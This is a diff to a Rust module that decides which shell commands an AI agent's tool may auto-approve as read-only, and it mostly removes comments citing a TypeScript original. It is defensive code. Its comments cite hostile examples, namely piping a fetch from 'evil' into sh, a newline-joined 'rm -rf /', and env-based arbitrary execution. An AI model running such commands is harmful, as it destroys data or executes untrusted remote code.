@@ -1,10 +1,8 @@
 //! Read-only command validation.
 //!
-//! TS: readOnlyValidation.ts + readOnlyCommandValidation.ts — 40+ safe
-//! commands, 200+ flag configs, docker/gh/kubectl read-only subcommands.
-//! Aligned with cocode-rs utils/shell-parser/src/safety/is_safe_command.rs.
-//!
-//! Commands in the allowlist can be auto-approved without user permission.
+//! Covers 40+ safe commands, 200+ flag configs, docker/gh/kubectl read-only
+//! subcommands. Commands in the allowlist can be auto-approved without user
+//! permission.
 
 /// Check if a command string is read-only (safe to auto-approve).
 ///
@@ -12,13 +10,11 @@
 /// 1. The command contains no construct whose runtime effect can't be known
 ///    statically ([`has_dynamic_or_control`]) — `$`-expansion / command
 ///    substitution / process substitution / input or file-writing redirection
-///    / background `&` / newline-joined commands. TS mirrors:
-///    `containsUnquotedExpansion` + `validateRedirections` + `validateNewlines`.
+///    / background `&` / newline-joined commands.
 /// 2. Every subcommand of a `&&` / `||` / `;` / `|` compound has a read-only
-///    leading command — TS `readOnlyValidation.ts:1968-1983`
-///    `splitCommand(command).every(isCommandReadOnly)`. Inspecting only the
-///    first token would let `ls && curl evil | sh` (or `ls & curl evil`, or a
-///    newline-joined `ls\nrm -rf /`) auto-approve and skip the security gate.
+///    leading command. Inspecting only the first token would let
+///    `ls && curl evil | sh` (or `ls & curl evil`, or a newline-joined
+///    `ls\nrm -rf /`) auto-approve and skip the security gate.
 ///
 /// Returns false if uncertain (conservative).
 pub fn is_read_only_command(command: &str) -> bool {
@@ -46,23 +42,21 @@ pub fn is_read_only_command(command: &str) -> bool {
 /// from the static text, so it must NOT be auto-classified read-only and must
 /// fall through to the security/approval gate.
 ///
-/// Quote semantics mirror TS `containsUnquotedExpansion`: single quotes
-/// suppress everything; double quotes still allow `$`/backtick expansion; a
-/// backslash escapes the next character everywhere except inside single quotes
-/// (where `\` is literal). Compound operators `&&` / `||` / `;` / `|` are
-/// allowed here — the splitter checks each subcommand separately.
+/// Quote semantics: single quotes suppress everything; double quotes still
+/// allow `$`/backtick expansion; a backslash escapes the next character
+/// everywhere except inside single quotes (where `\` is literal). Compound
+/// operators `&&` / `||` / `;` / `|` are allowed here — the splitter checks
+/// each subcommand separately.
 ///
 /// Rejected (forces the approval gate):
-/// - `$` / backtick — variable / arithmetic / command substitution (TS
-///   `containsUnquotedExpansion`); active inside double quotes too.
+/// - `$` / backtick — variable / arithmetic / command substitution; active
+///   inside double quotes too.
 /// - unquoted `* ? [ ]` globs — can expand at runtime to a dangerous flag
-///   (`find . -de?ete`); TS `containsUnquotedExpansion` rejects these.
+///   (`find . -de?ete`).
 /// - unquoted `{ } ( )` — brace expansion / subshell grouping: runtime-
-///   expandable or runs a subshell; TS excludes them from the safe-command
-///   regexes and rejects subshells via `bashCommandIsSafe`.
+///   expandable or runs a subshell.
 /// - bare `&` background, redirections (`>` to a non-discard target, `<`,
-///   here-strings, process substitution), and newline-joined commands
-///   (TS `validateRedirections` + `validateNewlines`).
+///   here-strings, process substitution), and newline-joined commands.
 fn has_dynamic_or_control(command: &str) -> bool {
     let b = command.as_bytes();
     let mut in_single = false;
@@ -73,7 +67,7 @@ fn has_dynamic_or_control(command: &str) -> bool {
         let c = b[i];
 
         // Backslash escapes the next char everywhere except inside single
-        // quotes, where `\` is literal (bash). Mirrors TS containsUnquotedExpansion.
+        // quotes, where `\` is literal (bash).
         if escaped {
             escaped = false;
             i += 1;
@@ -88,8 +82,8 @@ fn has_dynamic_or_control(command: &str) -> bool {
         match c {
             b'\'' if !in_double => in_single = !in_single,
             b'"' if !in_single => in_double = !in_double,
-            // `$VAR` / `${...}` / `$[...]` / `$((...))` / `$(...)` and backtick
-            // substitution — active inside double quotes too.
+            // `$VAR` / `${...}` / `$[...]` / `$((...))` / `$(...)` and backtick substitution
+            // — active inside double quotes too.
             b'$' | b'`' if !in_single => return true,
             // Inside single quotes everything below is literal.
             _ if in_single => {}
@@ -108,7 +102,7 @@ fn has_dynamic_or_control(command: &str) -> bool {
             }
             // Input redirect, here-string `<<<`, heredoc `<<`, process sub `<(`.
             b'<' => return true,
-            // Newline-joined commands (TS validateNewlines).
+            // Newline-joined commands.
             b'\n' | b'\r' => return true,
             // Output redirect: only side-effect-free discard targets are OK.
             b'>' => {
@@ -154,13 +148,10 @@ fn redirect_target_is_discard(command: &str, gt: usize) -> bool {
 /// Classification for a command whose read-only safety is decided by its name
 /// alone, or by its name plus a per-command argument validator.
 ///
-/// Mirrors the TS permission engine's two read-only mechanisms:
-/// - `AlwaysSafe` — the command is in `READONLY_COMMANDS` (or a hand-written
-///   read-only regex) with no dangerous-arg callback.
-/// - `SafeIfArgs(validator)` — the command is a `COMMAND_ALLOWLIST` entry with
-///   an `additionalCommandIsDangerousCallback`/regex. `validator(&argv[1..])`
-///   returns `true` when the trailing args are SAFE (the negation of TS's
-///   "is dangerous" predicate).
+/// - `AlwaysSafe` — the command is in the read-only allowlist with no
+///   dangerous-arg callback.
+/// - `SafeIfArgs(validator)` — the command has an argument-safety callback.
+///   `validator(&argv[1..])` returns `true` when the trailing args are SAFE.
 enum ReadOnlyRule {
     AlwaysSafe,
     /// `validator(args)` where `args == &argv[1..]`; returns `true` if safe.
@@ -171,15 +162,14 @@ enum ReadOnlyRule {
 /// is not classified here — `is_safe_to_call` falls through to the
 /// conditional-command match (find/rg/git/sed/curl/…) or to "not read-only".
 ///
-/// Derived from TS `READONLY_COMMANDS` + `COMMAND_ALLOWLIST`
-/// (readOnlyValidation.ts). Notable removals vs a naive "looks harmless" list:
-/// `env`/`printenv` (env exfiltration + `env FOO=1 sh -c` arbitrary exec),
-/// pagers/`top` (`!`/shell-escape), and network tools (`ping`/`dig`/…) are NOT
-/// read-only in TS and are intentionally absent here.
+/// Notable omissions vs a naive "looks harmless" list: `env`/`printenv` (env
+/// exfiltration + `env FOO=1 sh -c` arbitrary exec), pagers/`top`
+/// (`!`/shell-escape), and network tools (`ping`/`dig`/…) are intentionally
+/// absent.
 fn read_only_rule(cmd: &str) -> Option<ReadOnlyRule> {
     use ReadOnlyRule::{AlwaysSafe, SafeIfArgs};
     let rule = match cmd {
-        // TS READONLY_COMMANDS + hand-written read-only regexes (name-only safe).
+        // Name-only safe commands (no argument validation needed).
         "cat" | "cd" | "cut" | "echo" | "expr" | "false" | "grep" | "egrep" | "fgrep" | "head"
         | "id" | "ls" | "nl" | "paste" | "pwd" | "rev" | "seq" | "stat" | "tail" | "tr"
         | "true" | "uname" | "uniq" | "wc" | "which" | "whoami" | "numfmt" | "tac" | "file"
@@ -187,7 +177,7 @@ fn read_only_rule(cmd: &str) -> Option<ReadOnlyRule> {
         | "basename" | "dirname" | "realpath" | "md5sum" | "sha256sum" | "sha1sum" | "column"
         | "fmt" | "fold" | "expand" | "unexpand" | "strings" | "od" | "hexdump" => AlwaysSafe,
 
-        // TS COMMAND_ALLOWLIST entries with dangerous-arg callbacks/regex.
+        // Commands with argument-safety callbacks.
         "date" => SafeIfArgs(date_args_safe),
         "hostname" => SafeIfArgs(hostname_args_safe),
         "ps" => SafeIfArgs(ps_args_safe),
@@ -199,9 +189,8 @@ fn read_only_rule(cmd: &str) -> Option<ReadOnlyRule> {
 }
 
 /// `date`: read-only only when every positional is a `+FORMAT` string and no
-/// system-time-setting flag is present. Mirrors TS date callback
-/// (readOnlyValidation.ts:756-794) + safeFlags-by-omission (no `-s`/`--set`,
-/// no `-f`/`--file`). `args` are the tokens after `date`.
+/// system-time-setting flag is present (no `-s`/`--set`, no `-f`/`--file`).
+/// `args` are the tokens after `date`.
 ///
 /// Conservative under whitespace tokenization: a quoted format like
 /// `date '+%Y %m'` tokenizes to `'+%Y` / `%m'`, which fail the `+` prefix
@@ -209,7 +198,7 @@ fn read_only_rule(cmd: &str) -> Option<ReadOnlyRule> {
 fn date_args_safe(args: &[&str]) -> bool {
     // Flags that consume the following token as their (display-only) argument.
     const FLAGS_WITH_ARGS: &[&str] = &["-d", "--date", "-r", "--reference"];
-    // Flags that SET system time — blocked by omission in TS safeFlags.
+    // Flags that SET system time — blocked.
     const SET_FLAGS: &[&str] = &["-s", "--set", "-f", "--file"];
     let mut i = 0;
     while i < args.len() {
@@ -241,14 +230,13 @@ fn date_args_safe(args: &[&str]) -> bool {
 
 /// `hostname`: display-only. Read-only iff every token is a short single-letter
 /// flag (`-x`) or a long flag (`--name`) with NO positional (a positional sets
-/// the hostname) and no `-F`/`-b`-style value flags. Mirrors TS regex
-/// `^hostname(?:\s+(?:-[a-zA-Z]|--[a-zA-Z-]+))*\s*$` (readOnlyValidation.ts:827).
+/// the hostname) and no `-F`/`-b`-style value flags.
 fn hostname_args_safe(args: &[&str]) -> bool {
     args.iter().all(|t| {
         if let Some(long) = t.strip_prefix("--") {
             !long.is_empty() && long.bytes().all(|b| b.is_ascii_alphabetic() || b == b'-')
         } else if let Some(short) = t.strip_prefix('-') {
-            // Exactly one ASCII letter (TS `-[a-zA-Z]`): no bundles, no value.
+            // Exactly one ASCII letter: no bundles, no value.
             short.len() == 1 && short.as_bytes()[0].is_ascii_alphabetic()
         } else {
             false // positional ⇒ sets hostname
@@ -257,8 +245,7 @@ fn hostname_args_safe(args: &[&str]) -> bool {
 }
 
 /// `ps`: dangerous if any dash-less BSD-style letter group contains `e` — the
-/// `e` modifier dumps each process's environment. Mirrors the TS callback regex
-/// `/^[a-zA-Z]*e[a-zA-Z]*$/` on non-dashed tokens (readOnlyValidation.ts:426).
+/// `e` modifier dumps each process's environment.
 /// UNIX-style `-e` (dashed) is fine; only the BSD `axe`/`e` form leaks env.
 fn ps_args_safe(args: &[&str]) -> bool {
     !args.iter().any(|t| {
@@ -269,9 +256,8 @@ fn ps_args_safe(args: &[&str]) -> bool {
     })
 }
 
-/// `sort`: read-only unless writing output to a file. TS safeFlags omit
-/// `-o`/`--output` (readOnlyValidation.ts:247-303); `-S`/`--buffer-size` is
-/// allowed. Mirrors the `base64` attached-form handling above.
+/// `sort`: read-only unless writing output to a file. `-o`/`--output` is
+/// blocked; `-S`/`--buffer-size` is allowed.
 fn sort_args_safe(args: &[&str]) -> bool {
     !args.iter().any(|arg| {
         matches!(*arg, "-o" | "--output")
@@ -283,9 +269,9 @@ fn sort_args_safe(args: &[&str]) -> bool {
 /// Check if an argv array represents a safe (read-only) command.
 ///
 /// First consults the [`read_only_rule`] table (name-only and arg-validated
-/// commands, mirroring TS `READONLY_COMMANDS` + `COMMAND_ALLOWLIST`), then
-/// falls through to the conditional commands (find/rg/git/sed/curl/wget/
-/// docker/gh/kubectl/base64/python/node) that need bespoke flag analysis.
+/// commands), then falls through to the conditional commands (find/rg/git/sed/
+/// curl/wget/docker/gh/kubectl/base64/python/node) that need bespoke flag
+/// analysis.
 fn is_safe_to_call(argv: &[&str]) -> bool {
     let Some(&cmd0) = argv.first() else {
         return false;
@@ -342,11 +328,10 @@ fn is_safe_to_call(argv: &[&str]) -> bool {
         // Language / build toolchains execute arbitrary project code
         // (cargo runs build.rs + tests, npm/yarn run package scripts,
         // `python -c/-m` runs inline code), so they are NOT auto-approvable —
-        // only a bare version probe is. TS READONLY_COMMAND_REGEXES allowlists
-        // the ANCHORED `^python --version$` / `^node -v$` only, so trailing args
-        // must be rejected: `node -v --run build` runs the package script
-        // (node processes `--run` before `-v`). Require exact arity to mirror
-        // the `^...$` anchors. cargo/npm/npx/yarn/pnpm fall through to the gate.
+        // only a bare version probe is. Trailing args must be rejected:
+        // `node -v --run build` runs the package script (node processes `--run`
+        // before `-v`). Require exact arity. cargo/npm/npx/yarn/pnpm fall
+        // through to the gate.
         "python" | "python3" => argv.len() == 2 && argv.get(1).copied() == Some("--version"),
         "node" => argv.len() == 2 && matches!(argv.get(1).copied(), Some("-v" | "--version")),
 
@@ -361,8 +346,7 @@ fn is_safe_to_call(argv: &[&str]) -> bool {
         // flags (-f/--from-file/--rawfile/--slurpfile/-L/--library-path) have
         // side effects. They fall through to `check_security` (JqDangerAnalyzer
         // → Ask) via BashTool::check_permissions; benign jq passes there with no
-        // flag. TS routes all jq through validateJqCommand (ask/passthrough).
-        // xargs with safe commands is handled elsewhere; bare xargs is not safe.
+        // flag. xargs with safe commands is handled elsewhere; bare xargs is not safe.
         _ => false,
     }
 }
